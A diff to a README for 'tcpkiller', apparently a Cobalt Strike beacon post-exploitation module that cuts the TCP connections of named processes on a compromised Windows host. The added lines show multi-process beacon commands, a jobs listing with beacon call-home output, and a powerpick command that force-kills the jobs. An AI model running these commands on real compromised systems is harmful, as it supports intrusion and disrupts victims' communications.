@@ -18,7 +18,28 @@ beacon > tcpkiller ncat.exe 120
 
 // This will terminate all TCP connections to ncat.exe indefinitely and check every second
 beacon > tcpkiller ncat.exe 0
+
+// Multi-process assignment
+beacon > tcpkiller dingtalk.exe,ncat.exe,curl.exe 120
+beacon > tcpkiller "dingtalk.exe, ncat.exe, curl.exe" 120
+
+// 3 tasks will be assigned as post-exploitation jobs
+beacon > jobs
+[08/13 18:16:04] [*] Tasked beacon to list jobs
+[08/13 18:16:04] [+] host called home, sent: 8 bytes
+[08/13 18:16:04] [*] Jobs
+
+ JID  PID   Description
+ ---  ---   -----------
+ 44   20412 tcpkiller (dingtalk.exe)
+ 45   28756 tcpkiller (ncat.exe)
+ 46   44216 tcpkiller (curl.exe)
+
+// You can kill these jobs by powerpick (recommend!)
+beacon > powerpick ps -id 20412,28756,44216 | kill -fo
 ```
+
+![DEMO](asset/demo.jpg)
 
 The default `tcpkiller.x64.dll` is set to debug mode, and all debug output is written to `C:\Windows\Temp\reflective_debug.log`, you can turn it off in `dllmain.cpp`.  
 
